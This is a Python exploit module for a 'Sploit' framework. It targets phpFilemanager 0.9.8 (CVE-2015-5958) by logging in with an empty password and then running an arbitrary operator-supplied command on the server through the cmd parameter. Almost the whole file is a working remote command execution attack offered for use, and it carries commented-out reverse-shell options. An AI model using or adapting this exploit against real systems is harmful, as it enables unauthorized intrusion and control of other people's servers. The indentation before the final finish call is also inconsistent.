from Sploit import Sploit
from collections import OrderedDict
from shellcodes.Shellcodes import OSShellcodes

import argparse
import requests, sys

INFO = {}
INFO['NAME'] = "RCE phpFilemanager-0.9.8"
INFO['DESCRIPTION'] = "RCE phpFilemanager-0.9.8"
INFO['VENDOR'] = ""
INFO['CVE Name'] = "CVE-2015-5958"
INFO['NOTES'] = """
"""
INFO['DOWNLOAD_LINK'] = ""
INFO['LINKS'] = [""]
INFO['CHANGELOG'] = "1.0 14.02.20"
INFO['PATH'] = "/" #folder on website
INFO['AUTHOR'] = "dmts"

OPTIONS = OrderedDict()
OPTIONS["URL"] = "", dict(description = 'URL to phpFilemanager-0.9.8')
OPTIONS["COMMAND"] = "", dict(description = 'Command to run')
#OPTIONS["LOCAL_IP_ADDRESS"] = "192.168.1.115", dict(description = 'System IP address (ex. 192.168.10.20)')
#OPTIONS["REVERSE_CONNECTION_PORT"] = 4000, dict(description = 'Reverse connection port for shellcode')
#####################################################################
class exploit(Sploit):
	def __init__(self,url="",command='',logger=None):
		Sploit.__init__(self, logger=logger)
		self.name = INFO['NAME'] 
		self.url = url
		self.command = command
		#self.ip = ip
		#self.portr = portr
	def args(self):
		self.args = Sploit.args(self, OPTIONS)
		self.url = self.args.get("URL", self.url)
		self.command = self.args.get("COMMAND", self.command)
		#self.ip = self.args.get("LOCAL_IP_ADDRESS", self.ip)
		#self.portr = self.args.get("REVERSE_CONNECTION_PORT", self.portr)

	def attack(self,url,command):
		session = requests.session()
		try:
			url='http://'+url+'/index.php'
			params={'frame':3,'pass':''}
			get_in =session.post(url,data=params)
			get_in.raise_for_status()
		except Exception as e:
			self.log('[!] [FAIL] Failed to access : '+e)
			sys.exit(1)
		try:
			resp =session.get(url,params={'action':6,'cmd':command})
			resp.raise_for_status() 
			self.log('[*] Command to execute : '+command)
			self.log(resp.text)		
		except requests.exceptions.HTTPError as e:
			self.log('[!] [FAIL] Failed to execute command : '+e)
			sys.exit(1)

	def run(self):
		self.args()
		self.log('Starting')
		######### MAIN CODE ###########
		self.attack(self.url,self.command)	
		###############################
        	self.finish(True)

#####################################################################
if __name__ == '__main__':
    print"Running exploit %s .. " % INFO['NAME']
    e = exploit()
    e.run()


